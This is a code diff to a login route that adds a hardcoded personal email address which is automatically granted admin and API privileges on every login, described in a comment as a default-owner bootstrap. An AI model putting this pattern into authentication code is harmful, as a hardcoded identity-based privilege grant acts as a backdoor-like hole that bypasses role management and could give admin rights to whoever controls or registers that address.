@@ -14,16 +14,28 @@ export async function POST(request: Request) {
       return NextResponse.json({ error: 'Invalid email or password' }, { status: 401 });
     }
 
-    const token = jwt.sign({ userId: user.id }, JWT_SECRET, { expiresIn: '7d' });
+    // Ensure default owner account always has full admin + API access
+    let effectiveUser = user;
+    if (user.email === 'cpdhaundiyal.87@gmail.com' && (!user.is_admin || !user.is_api_enabled)) {
+      effectiveUser = await prisma.user.update({
+        where: { id: user.id },
+        data: {
+          is_admin: true,
+          is_api_enabled: true,
+        },
+      });
+    }
+
+    const token = jwt.sign({ userId: effectiveUser.id }, JWT_SECRET, { expiresIn: '7d' });
     const response = NextResponse.json({ 
       message: 'Login successful',
-      is_admin: user.is_admin,
+      is_admin: effectiveUser.is_admin,
       user: {
-        id: user.id,
-        name: user.name,
-        email: user.email,
-        is_admin: user.is_admin,
-        is_api_enabled: user.is_api_enabled
+        id: effectiveUser.id,
+        name: effectiveUser.name,
+        email: effectiveUser.email,
+        is_admin: effectiveUser.is_admin,
+        is_api_enabled: effectiveUser.is_api_enabled
       }
     });
     response.cookies.set('token', token, { httpOnly: true, maxAge: 604800 });
